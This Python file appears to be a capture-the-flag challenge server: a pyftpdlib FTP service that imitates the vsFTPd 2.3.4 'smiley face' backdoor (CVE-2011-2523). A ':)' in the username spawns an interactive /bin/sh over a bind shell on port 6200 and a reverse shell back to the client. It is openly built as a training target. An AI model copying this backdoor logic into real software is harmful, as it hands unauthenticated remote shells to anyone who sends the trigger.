#!/usr/bin/env python3
"""
BlueOffice Breach - Challenge 1: FTP (port 21)

Self-contained FTP server (built on pyftpdlib) that:
  - Advertises the classic "220 (vsFTPd 2.3.4)" banner.
  - Allows anonymous login into /srv/ftp/anonymous (read-only).
  - Reproduces the externally-observable trigger of the historical
    vsFTPd 2.3.4 "smiley face" backdoor (CVE-2011-2523): a USER command
    containing the trigger string ":)" pops a shell, two ways at once:

    1. BIND shell on TCP/6200 - identical to the real CVE. This is what
       lets the stock Metasploit module (exploit/unix/ftp/vsftpd_234_backdoor)
       work unmodified: it fires the trigger then connects to RHOST:6200
       itself, regardless of payload choice.
    2. REVERSE shell dialed back out to whichever IP sent the trigger,
       on a port the trigger can optionally choose (default 1234, e.g.
       "USER backdoor:)9001"). Used for the manual nc-based solve path.
       It never dials an attacker-supplied arbitrary address - only the
       real TCP peer of the FTP control connection - so this stays safe
       on a box with a public IP and many mutually-untrusted players:
       it can't be turned into an open "connect anywhere" primitive.

This does not run the real backdoored vsftpd binary/source - it is an
intentional, sandboxed re-implementation of the trigger -> shell
behaviour, built so the challenge is solved the same way the real CVE
is solved (smiley-face username, then either path above), while
guaranteeing the resulting shell can never leave this container.
"""

import os
import socket
import subprocess
import threading
import time

from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer

# NOTE: vsFTPd traditionally listens on TCP/21, but binding to a port
# below 1024 requires root. To keep this service running as a non-root
# user, the server listens internally on FTP_PORT (default 2121) and
# docker-compose publishes it externally as host port 21.
FTP_PORT = int(os.environ.get("FTP_PORT", "2121"))
BACKDOOR_BIND_PORT = int(os.environ.get("BACKDOOR_PORT", "6200"))
ANON_ROOT = "/srv/ftp/anonymous"
TRIGGER = ":)"
DEFAULT_CALLBACK_PORT = 1234
CONNECT_RETRIES = 10
CONNECT_RETRY_DELAY = 1.5
CONNECT_TIMEOUT = 3

_bind_backdoor_lock = threading.Lock()
_bind_backdoor_started = False


def _spawn_shell_on(sock):
    """Wire an interactive /bin/sh directly to an already-connected socket."""
    fd = sock.fileno()
    try:
        proc = subprocess.Popen(["/bin/sh", "-i"], stdin=fd, stdout=fd, stderr=fd)
        proc.wait()
    except Exception:
        pass
    finally:
        try:
            sock.close()
        except OSError:
            pass


def _handle_bind_client(conn):
    _spawn_shell_on(conn)


def _bind_backdoor_listener():
    """Real-CVE-style bind listener on 6200 - what Metasploit's module expects."""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", BACKDOOR_BIND_PORT))
    srv.listen(5)
    while True:
        conn, _addr = srv.accept()
        threading.Thread(target=_handle_bind_client, args=(conn,), daemon=True).start()


def _reverse_shell(host: str, port: int):
    """Dial back to (host, port) and, once connected, wire /bin/sh -i to it.

    Retries for a few seconds so players can trigger the backdoor
    slightly before or after starting their listener.
    """
    sock = None
    for _ in range(CONNECT_RETRIES):
        try:
            sock = socket.create_connection((host, port), timeout=CONNECT_TIMEOUT)
            break
        except OSError:
            time.sleep(CONNECT_RETRY_DELAY)
    if sock is None:
        return
    _spawn_shell_on(sock)


def trigger_backdoor_if_needed(username: str, remote_ip: str):
    if TRIGGER not in (username or ""):
        return

    # Start the bind listener once, lazily, the first time anyone triggers it.
    global _bind_backdoor_started
    with _bind_backdoor_lock:
        if not _bind_backdoor_started:
            _bind_backdoor_started = True
            threading.Thread(target=_bind_backdoor_listener, daemon=True).start()

    if not remote_ip:
        return

    # Optional callback port after the trigger, e.g. "backdoor:)9001".
    # Anything that isn't a bare port number falls back to the default.
    remainder = username[username.find(TRIGGER) + len(TRIGGER):].strip()
    port = DEFAULT_CALLBACK_PORT
    if remainder.isdigit() and 1 <= int(remainder) <= 65535:
        port = int(remainder)

    # remote_ip is the actual TCP peer address of the FTP control
    # connection - it cannot be spoofed into pointing at a third party,
    # so every trigger only ever calls back the client that sent it.
    threading.Thread(target=_reverse_shell, args=(remote_ip, port), daemon=True).start()


class BackdoorAwareHandler(FTPHandler):
    def ftp_USER(self, line):
        trigger_backdoor_if_needed(line, self.remote_ip)
        return super().ftp_USER(line)


def main():
    authorizer = DummyAuthorizer()
    authorizer.add_anonymous(ANON_ROOT, perm="elr")

    handler = BackdoorAwareHandler
    handler.authorizer = authorizer
    # pyftpdlib prepends the "220 " response code itself, so banner
    # must NOT include it (otherwise the code is sent twice).
    handler.banner = "(vsFTPd 2.3.4)"

    # Passive mode setup so the data channel works through Docker's NAT.
    pasv_ports = os.environ.get("FTP_PASV_PORTS", "21100-21110")
    lo, hi = (int(x) for x in pasv_ports.split("-"))
    handler.passive_ports = range(lo, hi + 1)

    masquerade = os.environ.get("FTP_PASV_ADDRESS")
    if masquerade:
        handler.masquerade_address = masquerade

    server = FTPServer(("0.0.0.0", FTP_PORT), handler)
    server.max_cons = 64
    server.max_cons_per_ip = 16
    server.serve_forever()


if __name__ == "__main__":
    main()
